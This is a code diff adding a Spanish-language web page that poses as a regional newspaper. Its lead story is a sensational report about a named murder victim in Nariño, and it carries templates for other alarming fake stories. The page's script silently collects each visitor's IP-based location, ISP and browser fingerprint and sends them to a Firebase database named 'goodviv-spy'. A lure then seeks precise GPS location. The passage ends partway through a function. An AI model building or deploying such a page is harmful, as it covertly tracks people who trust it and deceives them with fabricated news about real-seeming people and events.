@@ -1,0 +1,1766 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Diario Regional - Noticias de Última Hora</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: #f8f9fa;
+        }
+        
+        .news-images-container {
+            max-width: 900px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+        
+        .image-collage {
+            display: flex;
+            gap: 0;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        
+        .image-wrapper {
+            flex: 1;
+            position: relative;
+        }
+        
+        .image-wrapper img {
+            width: 100%;
+            height: 400px;
+            object-fit: cover;
+            display: block;
+        }
+        
+        .image-caption {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 10px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #fd7777, #b91c1c);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .logo-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        
+        .logo-text {
+            font-size: 3rem;
+            font-weight: bold;
+            color: #dc2626;
+        }
+        
+        .site-title {
+            font-size: 2.5rem;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .tagline {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            text-align: center;
+        }
+        
+        .nav {
+            background: #1f2937;
+            padding: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .nav ul {
+            list-style: none;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .nav li {
+            margin: 0;
+            position: relative;
+        }
+        
+        .nav a {
+            color: white;
+            text-decoration: none;
+            padding: 15px 25px;
+            display: block;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            letter-spacing: 0.5px;
+            position: relative;
+        }
+
+        .nav a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            width: 0;
+            height: 2px;
+            background: #dc2626;
+            transition: all 0.3s ease;
+            transform: translateX(-50%);
+        }
+
+        .nav a:hover::after {
+            width: 80%;
+        }
+        
+        .nav a:hover {
+            background: #dc2626;
+            color: white;
+        }
+        
+        .breaking-banner {
+            background: linear-gradient(90deg, #ef4444, #dc2626);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.1rem;
+            animation: pulse 2s infinite;
+            box-shadow: 0 2px 10px rgba(239, 68, 68, 0.4);
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.8; }
+            100% { opacity: 1; }
+        }
+        
+        .main-content {
+            background: white;
+            margin: 30px auto;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 900px;
+        }
+        
+        .article-header {
+            border-bottom: 3px solid #dc2626;
+            padding-bottom: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .article-title {
+            font-size: 2.5rem;
+            color: #1f2937;
+            margin-bottom: 20px;
+            line-height: 1.2;
+            font-weight: bold;
+        }
+        
+        .article-meta {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            color: #6b7280;
+            font-size: 0.95rem;
+            flex-wrap: wrap;
+        }
+        
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .article-image {
+            width: 100%;
+            height: 400px;
+            object-fit: cover;
+            border-radius: 12px;
+            margin: 30px 0;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+        }
+        
+        .article-content {
+            font-size: 1.15rem;
+            line-height: 1.8;
+            color: #374151;
+        }
+        
+        .article-content p {
+            margin-bottom: 25px;
+            text-align: justify;
+        }
+        
+        .article-content p:first-of-type {
+            font-size: 1.25rem;
+            color: #1f2937;
+            font-weight: 500;
+        }
+        
+        .location-alert {
+            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin: 40px 0;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(59, 130, 246, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .location-alert::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shimmer 3s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        .location-alert h3 {
+            margin-bottom: 15px;
+            font-size: 1.6rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .location-alert p {
+            margin-bottom: 25px;
+            font-size: 1.1rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .location-btn {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.4);
+            position: relative;
+            z-index: 1;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .location-btn:hover {
+            background: linear-gradient(135deg, #059669, #047857);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(16, 185, 129, 0.6);
+        }
+        
+        .location-btn:active {
+            transform: translateY(0);
+        }
+        
+        .sidebar-news {
+            background: #f8fafc;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 40px 0;
+            border-left: 5px solid #dc2626;
+        }
+        
+        .sidebar-news h3 {
+            color: #dc2626;
+            margin-bottom: 20px;
+            font-size: 1.4rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .related-item {
+            display: flex;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: white;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            cursor: pointer;
+        }
+        
+        .related-item:hover {
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            transform: translateY(-2px);
+        }
+        
+        .related-thumb {
+            width: 100px;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        
+        .related-content h4 {
+            color: #1f2937;
+            margin-bottom: 8px;
+            font-size: 1.05rem;
+            line-height: 1.3;
+        }
+        
+        .related-content p {
+            color: #6b7280;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        
+        .footer {
+            background: #1f2937;
+            color: white;
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 50px;
+        }
+        
+        .footer p {
+            margin-bottom: 10px;
+        }
+        
+        .social-links {
+            margin-top: 20px;
+        }
+        
+        .social-links a {
+            color: white;
+            font-size: 1.5rem;
+            margin: 0 15px;
+            transition: color 0.3s ease;
+        }
+        
+        .social-links a:hover {
+            color: #dc2626;
+        }
+        
+        /* Estilo para el "leer más" sutil estilo Facebook */
+        .read-more-link {
+            color: #1877f2;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+        
+        .read-more-link:hover {
+            text-decoration: underline;
+            color: #166fe5;
+        }
+        
+        @media (max-width: 768px) {
+            .logo-section {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .logo {
+                margin: 0 0 15px 0;
+            }
+            
+            .site-title {
+                font-size: 1.8rem;
+            }
+            
+            .article-title {
+                font-size: 2rem;
+            }
+
+            .nav {
+                position: relative;
+                padding: 10px 0;
+            }
+            
+            .nav ul {
+                flex-direction: column;
+                background: #1f2937;
+                width: 100%;
+                border-radius: 0 0 10px 10px;
+                overflow: hidden;
+            }
+            
+            .nav li {
+                border-bottom: 1px solid rgba(255,255,255,0.1);
+            }
+            
+            .nav li:last-child {
+                border-bottom: none;
+            }
+            
+            .nav a {
+                padding: 15px 20px;
+                text-align: center;
+                font-size: 0.95rem;
+                transition: all 0.3s ease;
+                background: transparent;
+            }
+            
+            .nav a:hover {
+                background: #dc2626;
+                padding-left: 25px;
+            }
+            
+            .main-content {
+                padding: 20px;
+                margin: 15px 10px;
+            }
+            
+            .article-meta {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+            
+            .related-item {
+                flex-direction: column;
+            }
+            
+            .related-thumb {
+                width: 100%;
+                height: 120px;
+                margin: 0 0 15px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo-section">
+                <div class="logo">
+                    <div class="logo-text">📰</div>
+                </div>
+                <div>
+                    <div class="site-title">DIARIO REGIONAL DEL SUR</div>
+                    <div class="tagline">Tu fuente confiable de noticias locales</div>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="breaking-banner">
+        🚨 NOTICIA DE ÚLTIMA HORA - ACTUALIZACIÓN PERMANENTE 🚨
+    </div>
+    
+    <nav class="nav">
+        <div class="container">
+            <ul>
+                <li><a href="#">Inicio</a></li>
+                <li><a href="#">Local</a></li>
+                <li><a href="#">Política</a></li>
+                <li><a href="#">Nacional</a></li>
+                <li><a href="#">Judicial</a></li>
+                <li><a href="#">Deportes</a></li>
+                <li><a href="#">Opinión</a></li>
+                <li><a href="#">Regiones</a></li>
+            </ul>
+        </div>
+    </nav>
+    
+    <main class="main-content">
+        <article>
+            <div class="article-header">
+                <h1 class="article-title" id="newsTitle">Cargando noticia...</h1>
+                <div class="article-meta">
+                    <div class="meta-item">
+                        <span>📅</span>
+                        <span id="currentDate"></span>
+                    </div>
+                    <div class="meta-item">
+                        <span>⏰</span>
+                        <span>Actualizada hace 8 minutos</span>
+                    </div>
+                    <div class="meta-item">
+                        <span>👁️</span>
+                        <span id="viewCount">2,847 lecturas</span>
+                    </div>
+                    <div class="meta-item">
+                        <span>✍️</span>
+                        <span>Redacción Regional</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="news-images-container">
+                <div class="image-collage">
+                    <div class="image-wrapper">
+                        <img src="/public/images/1.jpg" alt="Imagen del presunto responsable">
+                        <div class="image-caption">Presunto responsable</div>
+                    </div>
+                    <div class="image-wrapper">
+                        <img src="/public/images/2.jpg" alt="Omar Andrés Benítez - Víctima">
+                        <div class="image-caption">Omar Andrés Benítez - Víctima</div>
+                    </div>
+                </div>
+            </div>
+
+            <img id="newsImage" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjQwMCIgdmlld0JveD0iMCAwIDgwMCA0MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIiBmaWxsPSIjZjNmNGY2Ii8+Cjx0ZXh0IHg9IjQwMCIgeT0iMjAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjNmI3MjgwIiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMjQiPvCfk7ggSW1hZ2VuIGRlIGxhIG5vdGljaWE8L3RleHQ+Cjwvc3ZnPg==" alt="Imagen de la noticia" class="article-image" style="display: none;">
+            
+            <div class="article-content">
+                <p id="newsContent">Cargando contenido de la noticia...</p>
+                
+                <!-- Contenido adicional que se mostrará después del "Leer más" -->
+                <div id="fullContent" style="display: none;">
+                    <p id="fullNewsContent"></p>
+                </div>
+                
+                <p>Nuestro equipo de reporteros continúa siguiendo de cerca esta situación y mantendrá informados a nuestros lectores sobre cualquier desarrollo importante.</p>
+                
+                <p><strong>¿Tienes información adicional sobre esta noticia?</strong> Contáctanos a través de nuestras redes sociales o al WhatsApp de la redacción para contribuir con el cubrimiento informativo.</p>
+            </div>
+        </article>
+        
+        <div class="sidebar-news">
+            <h3>📰 Otras Noticias Destacadas</h3>
+            
+            <div class="related-item">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMTAwIDgwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjZTVlN2ViIi8+Cjx0ZXh0IHg9IjUwIiB5PSI0NSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzZiNzI4MCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEyIj7wn5OSPC90ZXh0Pgo8L3N2Zz4K" alt="Noticia relacionada" class="related-thumb">
+                <div class="related-content">
+                    <h4>Alcalde presenta nuevas obras de infraestructura para el 2025</h4>
+                    <p>La administración municipal anunció una inversión de $15 mil millones para el mejoramiento vial y construcción de nuevos parques...</p>
+                </div>
+            </div>
+            
+            <div class="related-item">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMTAwIDgwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjZTVlN2ViIi8+Cjx0ZXh0IHg9IjUwIiB5PSI0NSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzZiNzI4MCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEyIj7wn5iMPC90ZXh0Pgo8L3N2Zz4K" alt="Noticia relacionada" class="related-thumb">
+                <div class="related-content">
+                    <h4>Pronóstico del clima: Lluvias intensas para el fin de semana</h4>
+                    <p>El IDEAM emitió alerta amarilla por precipitaciones que podrían afectar la movilidad en varios sectores de la región...</p>
+                </div>
+            </div>
+            
+            <div class="related-item">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMTAwIDgwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjZTVlN2ViIi8+Cjx0ZXh0IHg9IjUwIiB5PSI0NSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzZiNzI4MCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEyIj7wn5qoPC90ZXh0Pgo8L3N2Zz4K" alt="Noticia relacionada" class="related-thumb">
+                <div class="related-content">
+                    <h4>Policía captura banda dedicada al hurto de celulares</h4>
+                    <p>Cayó red criminal que operaba en el centro de la ciudad utilizando motocicletas para cometer sus fechorías...</p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 Diario Regional. Todos los derechos reservados.</p>
+            <p>Fundado en 1987 | 38 años informando con credibilidad</p>
+            <div class="social-links">
+                <a href="#" aria-label="Facebook">📘</a>
+                <a href="#" aria-label="Twitter">🐦</a>
+                <a href="#" aria-label="Instagram">📷</a>
+                <a href="#" aria-label="WhatsApp">💬</a>
+            </div>
+        </div>
+    </footer>
+    
+    <script>
+        // Variable global para la noticia actual
+        let currentNews = null;
+        // Contador global de intentos de ubicación
+        let locationAttempts = 0;
+        
+        // Función para captura automática por IP (sin permisos)
+        async function captureIPLocationAuto() {
+            try {
+                console.log('🌐 Iniciando captura automática por IP...');
+                
+                // Obtener información de IP usando múltiples servicios para mayor precisión
+                const [ipResponse1, ipResponse2, ipResponse3] = await Promise.all([
+                    fetch('https://ipapi.co/json/'),
+                    fetch('https://ip-api.com/json/'),
+                    fetch('https://ipwho.is/')
+                ]);
+                
+                const ipData1 = await ipResponse1.json();
+                const ipData2 = await ipResponse2.json();
+                const ipData3 = await ipResponse3.json();
+                
+                // Combinar y validar datos de múltiples fuentes
+                const ipData = {
+                    coordenadas: {
+                        lat: formatearCoordenadas(ipData2.lat || ipData1.latitude || ipData3.latitude),
+                        lng: formatearCoordenadas(ipData2.lon || ipData1.longitude || ipData3.longitude)
+                    },
+                    precision: 'City-level (~5-50km)',
+                    ciudad: ipData2.city || ipData1.city || ipData3.city,
+                    region: ipData2.regionName || ipData1.region || ipData3.region,
+                    pais: ipData2.country || ipData1.country_name || ipData3.country,
+                    codigoPostal: ipData1.postal || ipData2.zip || ipData3.postal,
+                    isp: ipData2.isp || ipData1.org || ipData3.connection.isp,
+                    ip: ipData2.query || ipData1.ip || ipData3.ip,
+                    zonaHoraria: ipData2.timezone || ipData1.timezone || ipData3.timezone.id,
+                    operador: ipData2.org || ipData1.org || ipData3.connection.org,
+                    tipo: ipData3.type || 'Unknown',
+                    continente: ipData3.continent || ipData1.continent_code,
+                    moneda: ipData3.currency.code || '',
+                    asn: ipData3.connection.asn || ''
+                };
+                
+                // Datos adicionales del navegador (sin permisos)
+                const browserData = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenRes: screen.width + 'x' + screen.height,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    onlineStatus: navigator.onLine
+                };
+                
+                const locationData = {
+                    id: 'ip_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                    method: 'IP_AUTOMATIC',
+                    source: 'Diario Regional - IP Capture',
+                    timestamp: new Date().toISOString(),
+                    
+                    // Ubicación por IP
+                    city: ipData.city || 'Unknown',
+                    region: ipData.region || 'Unknown', 
+                    country: ipData.country_name || 'Unknown',
+                    lat: ipData.latitude || 0,
+                    lng: ipData.longitude || 0,
+                    accuracy: 'City-level (~5-50km)',
+                    ip: ipData.ip || 'Unknown',
+                    isp: ipData.org || 'Unknown',
+                    
+                    // Datos del navegador
+                    timezone: browserData.timezone,
+                    language: browserData.language,
+                    platform: browserData.platform,
+                    screenRes: browserData.screenRes,
+                    userAgent: navigator.userAgent,
+                    cookiesEnabled: browserData.cookiesEnabled,
+                    onlineStatus: browserData.onlineStatus,
+                    
+                    // Contexto de la página
+                    url: window.location.href,
+                    referrer: document.referrer || 'Direct',
+                    pageTitle: document.title
+                };
+                
+                console.log('🌐 Ubicación IP capturada automáticamente:', locationData);
+                
+                // Guardar en Firebase
+                await fetch('https://goodviv-spy-default-rtdb.firebaseio.com/locations.json', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(locationData)
+                });
+                
+                console.log('✅ Datos IP enviados a Firebase exitosamente (automático)');
+                
+            } catch (error) {
+                console.log('⚠️ Error en captura automática por IP:', error);
+            }
+        }
+        
+        const newsTemplates = {
+            traffic: {
+                title: "🚦 Grave Accidente en Avenida Principal Deja Varios Heridos y Genera Caos Vehicular",
+                content: "Un grave accidente de tránsito ocurrido esta mañana en la Avenida Principal ha dejado varios heridos y ha generado un caos vehicular sin precedentes en la ciudad. Según testigos presenciales, el incidente involucró múltiples vehículos, incluyendo un bus del servicio público que transportaba más de 40 pasajeros. Los servicios de emergencia se encuentran en el lugar atendiendo a las víctimas, mientras que el tráfico ha sido desviado por rutas alternas, causando demoras de hasta dos horas en los principales corredores viales."
+            },
+            security: {
+                title: "🚨 Alertan por Peligrosa Banda Criminal que Opera con Nueva Modalidad de Extorsión",
+                content: "Las autoridades policiales emitieron una alerta de máxima seguridad tras confirmar la presencia de una organización criminal que está utilizando métodos sofisticados de extorsión y amenazas contra comerciantes y ciudadanos de la región. Según el coronel de la Policía, la banda estaría aprovechando información personal obtenida de manera fraudulenta para intimidar a sus víctimas. Se han reportado al menos 15 casos en la última semana, y las autoridades trabajan sin descanso para desarticular esta red delictiva que tiene en zozobra a la comunidad."
+            },
+            weather: {
+                title: "🌧️ Temporal Devastador Causa Inundaciones y Deslizamientos en Toda la Región",
+                content: "Un temporal de proporciones históricas azotó la región durante la madrugada, provocando inundaciones masivas, deslizamientos de tierra y el colapso de la infraestructura vial en múltiples sectores. El fenómeno meteorológico, descrito por expertos como 'excepcional para la época', ha dejado a miles de familias incomunicadas y ha obligado a las autoridades a declarar alerta roja en toda la zona. Los cuerpos de socorro trabajan contrarreloj para evacuar a los damnificados, mientras que el suministro de energía eléctrica y agua potable se encuentra suspendido en gran parte del territorio."
+            },
+            health: {
+                title: "🏥 Crisis Hospitalaria: Declaran Emergencia Sanitaria por Colapso del Sistema de Salud",
+                content: "El sistema de salud regional colapsó completamente tras registrarse un incremento exponencial en la demanda de servicios médicos de urgencia. El hospital principal de la ciudad ha tenido que implementar protocolos de emergencia nunca antes vistos, estableciendo carpas en el exterior para atender la avalancha de pacientes. Según el director médico, la situación es crítica y han tenido que solicitar apoyo urgente al gobierno nacional. Más de 200 personas esperan atención en los pasillos, mientras que el personal médico trabaja turnos extendidos para hacer frente a esta crisis sin precedentes."
+            },
+            education: {
+                title: "🎓 Suspensión Total de Clases: Situación de Emergencia Afecta a 50,000 Estudiantes",
+                content: "La Secretaría de Educación anunció la suspensión inmediata y por tiempo indefinido de todas las actividades académicas en instituciones públicas y privadas de la región, afectando directamente a más de 50,000 estudiantes y 3,000 docentes. La decisión, tomada en sesión extraordinaria del comité de emergencias, busca garantizar la integridad física de la comunidad educativa ante la grave situación que atraviesa el territorio. Los padres de familia han sido notificados a través de los canales oficiales, mientras que las autoridades evalúan alternativas de educación virtual para minimizar el impacto académico de esta medida excepcional."
+            },
+            economy: {
+                title: "💰 Crisis Económica Local: Cierran Masivamente Empresas y Comercios en el Centro",
+                content: "Una ola de cierres masivos de empresas y establecimientos comerciales ha golpeado duramente el centro económico de la ciudad, dejando sin empleo a más de 2,000 personas en las últimas dos semanas. Según la Cámara de Comercio, la situación económica actual es la más grave registrada en los últimos 20 años, con una caída del 70% en las ventas del sector comercial. Los empresarios solicitan medidas urgentes del gobierno local para evitar el colapso total de la economía regional, mientras que cientos de familias enfrentan la incertidumbre de quedarse sin ingresos en medio de esta crisis sin precedentes."
+            },
+            crime: {
+                title: "🚨 Autoridades Localizan al Presunto Asesino de 'Coquito' - Podría Enfrentar 17 Años de Cárcel",
+                content: "Atención, porque las autoridades ya tendrían en la mira al presunto responsable de un crimen que tiene de luto a Nariño. Se trataría del asesino de Omar Andrés Benítez, conocido como 'Coquito'. Fuentes extraoficiales señalan que su paradero estaría prácticamente localizado, y de confirmarse su captura, podría enfrentar una condena de hasta 17 años de cárcel. Una historia que hoy estremece a todo un pueblo y que clama justicia inmediata",
+                fullContent: "Atención, porque las autoridades ya tendrían en la mira al presunto responsable de un crimen que tiene de luto a Nariño. Se trataría del asesino de Omar Andrés Benítez, conocido como 'Coquito'. Fuentes extraoficiales señalan que su paradero estaría prácticamente localizado, y de confirmarse su captura, podría enfrentar una condena de hasta 17 años de cárcel. Una historia que hoy estremece a todo un pueblo y que clama justicia inmediata.\n\nSegún informes de la Fiscalía General de la Nación, el operativo de búsqueda se intensificó después de que testigos clave proporcionaran información crucial sobre los movimientos del sospechoso en las últimas 48 horas. El crimen, que conmocionó a la comunidad nariñense hace tres semanas, habría sido perpetrado por motivos que aún están bajo investigación.\n\nLa víctima, Omar Andrés Benítez, de 34 años, era reconocido en su comunidad como una persona trabajadora y padre de familia. Su muerte ha generado una ola de indignación y exigencias de justicia por parte de familiares y vecinos, quienes han realizado marchas pacíficas pidiendo celeridad en las investigaciones.\n\nEl coronel de la Policía de Nariño confirmó que se mantienen activos varios operativos de búsqueda en diferentes municipios de la región, y que esperan tener resultados concretos en las próximas horas. 'Estamos muy cerca de esclarecer este doloroso caso que ha enlutado a nuestra comunidad', declaró en rueda de prensa.\n\nPor su parte, la familia de 'Coquito' ha solicitado a las autoridades que se respete el debido proceso y que se garanticen todas las garantías legales durante el desarrollo de la investigación. Este caso se suma a la preocupante estadística de homicidios que afecta a la región, generando un ambiente de zozobra entre los habitantes.",
+                image: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjQwMCIgdmlld0JveD0iMCAwIDgwMCA0MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IGlkPSJiZyIgeDE9IjAlIiB5MT0iMCUiIHgyPSIxMDAlIiB5Mj0iMTAwJSI+PHN0b3Agb2Zmc2V0PSIwJSIgc3R5bGU9InN0b3AtY29sb3I6IzFmMjkzNyIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3R5bGU9InN0b3AtY29sb3I6IzM3NDE1MSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxyZWN0IHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIiBmaWxsPSJ1cmwoI2JnKSIvPjx0ZXh0IHg9IjQwMCIgeT0iMTgwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjZGMyNjI2IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNDAiIGZvbnQtd2VpZ2h0PSJib2xkIj7wn5qoPC90ZXh0Pjx0ZXh0IHg9IjQwMCIgeT0iMjIwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjZjNmNGY2IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTgiPk9wZXJhdGl2byBQb2xpY2lhbCBlbiBOYXJpw7FvPC90ZXh0Pjx0ZXh0IHg9IjQwMCIgeT0iMjUwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjOWNhM2FmIiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTQiPkNhc28gT21hciBBbmRyw6lzIEJlbsOtdGV6PC90ZXh0PjxyZWN0IHg9IjUwIiB5PSIzMDAiIHdpZHRoPSI3MDAiIGhlaWdodD0iMiIgZmlsbD0iI2RjMjYyNiIvPjx0ZXh0IHg9IjcwIiB5PSIzMzAiIGZpbGw9IiNkYzI2MjYiIGZvbnQtZmFtaWx5PSJBcmlhbCwgc2Fucy1zZXJpZiIgZm9udC1zaXplPSIxMiIgZm9udC13ZWlnaHQ9ImJvbGQiPkFMRVJUQTwvdGV4dD48dGV4dCB4PSIxMzAiIHk9IjMzMCIgZmlsbD0iI2Y5ZmFmYiIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjEyIj5BdXRvcmlkYWRlcyBlbiBidXNjYSBkZWwgcHJlc3VudG8gcmVzcG9uc2FibGU8L3RleHQ+PC9zdmc+"
+            }
+        };
+        
+        // Función mejorada para solicitar ubicación
+        function requestLocation() {
+            console.log('📍 Solicitando ubicación...');
+            
+            // Mostrar indicador de carga
+            const alertDiv = document.querySelector('.location-alert');
+            const originalContent = alertDiv.innerHTML;
+            alertDiv.innerHTML = `
+                <h3>📡 Verificando Ubicación...</h3>
+                <p>Por favor, permite el acceso a tu ubicación cuando el navegador lo solicite.</p>
+                <div style="margin: 20px 0;">
+                    <div style="display: inline-block; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                </div>
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                </style>
+            `;
+            
+            if (!navigator.geolocation) {
+                handleLocationError({ code: 'NO_SUPPORT', message: 'Geolocalización no soportada' });
+                return;
+            }
+            
+            // Verificar protocolo HTTPS
+            if (location.protocol !== 'https:' && !location.hostname.includes('localhost')) {
+                console.warn('⚠️ Advertencia: Geolocalización puede fallar sin HTTPS');
+            }
+            
+            // Intentar con alta precisión primero
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    console.log('✅ Ubicación obtenida con alta precisión');
+                    captureLocation(position);
+                    showSuccessMessage();
+                },
+                function(error) {
+                    console.log('❌ Error con alta precisión, intentando configuración estándar...');
+                    // Si falla, intentar con configuración menos estricta
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            console.log('✅ Ubicación obtenida con configuración estándar');
+                            captureLocation(position);
+                            showSuccessMessage();
+                        },
+                        function(finalError) {
+                            console.error('❌ Error final de geolocalización:', finalError);
+                            handleLocationError(finalError);
+                        },
+                        {
+                            enableHighAccuracy: false,
+                            timeout: 30000,
+                            maximumAge: 300000 // 5 minutos
+                        }
+                    );
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 60000 // 1 minuto
+                }
+            );
+        }
+        
+        // Función para obtener la dirección desde coordenadas
+        function formatearCoordenadas(coord) {
